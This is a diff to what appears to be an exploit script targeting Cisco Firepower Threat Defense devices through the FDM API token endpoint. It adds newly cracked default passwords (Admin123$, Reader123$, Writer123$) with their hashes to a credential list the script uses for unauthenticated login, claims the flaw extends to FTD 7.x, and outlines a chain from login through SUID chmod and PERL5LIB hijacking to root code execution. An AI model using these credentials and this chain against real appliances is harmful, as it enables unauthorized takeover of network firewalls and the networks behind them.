@@ -24,17 +24,19 @@ CRACKED CREDENTIALS (SHA-256 brute-force):
   ADMIN role:
     username: admin   password: Admin123      hash: 3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2
     username: admin   password: Sourcefire    hash: 87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7
-    username: admin   password: [UNCRACKED]   hash: 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a
+    username: admin   password: Admin123$     hash: 22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a
 
   READER role:
     username: reader  password: Reader123     hash: 67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc
-    username: reader  password: [UNCRACKED]   hash: 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49
+    username: reader  password: Reader123$    hash: 38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49
 
   WRITER role:
     username: writer  password: Writer123     hash: fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664
-    username: writer  password: [UNCRACKED]   hash: 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0
+    username: writer  password: Writer123$    hash: 42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0
 
-  Uncracked hashes likely represent alternative version-specific defaults.
+  ALL 7 HASHES CRACKED (2026-08-19).
+  Pattern: {Role}123$ variants are likely newer FTD/FDM defaults where Cisco added '$'
+  to satisfy password complexity requirements (appears in FTD 7.x).
 
 SCOPE:
   DevAuthenticationProvider is the DEFAULT auth provider (isDefaultProvider=true).
@@ -58,7 +60,8 @@ Chain:
     → F-FTD-69 (sudo chmod SUID) → root
     → F-FTD-73 (PERL5LIB hijack) → root code exec
 
-Affected: FTD 6.7.0-65 (DevAuthenticationProvider extracted from core-security.jar)
+Affected: FTD 6.7.0-65 + 7.x (DevAuthenticationProvider in core-security.jar; {Role}123$ variants
+         confirm presence in 7.x — Cisco added '$' suffix for complexity requirements in later versions)
 Auth required: None (these ARE the credentials)
 """
 
@@ -77,17 +80,20 @@ TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"
 CRACKED_CREDS = [
     ("admin",  "Admin123"),
     ("admin",  "Sourcefire"),
+    ("admin",  "Admin123$"),
     ("reader", "Reader123"),
+    ("reader", "Reader123$"),
     ("writer", "Writer123"),
+    ("writer", "Writer123$"),
 ]
 
 KNOWN_HASHES = {
     "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2": ("admin",  "Admin123"),
     "87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7": ("admin",  "Sourcefire"),
-    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": ("admin",  "[UNCRACKED]"),
+    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": ("admin",  "Admin123$"),
     "67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc": ("reader", "Reader123"),
-    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": ("reader", "[UNCRACKED]"),
-    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": ("writer", "[UNCRACKED]"),
+    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": ("reader", "Reader123$"),
+    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": ("writer", "Writer123$"),
     "fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664": ("writer", "Writer123"),
 }
 
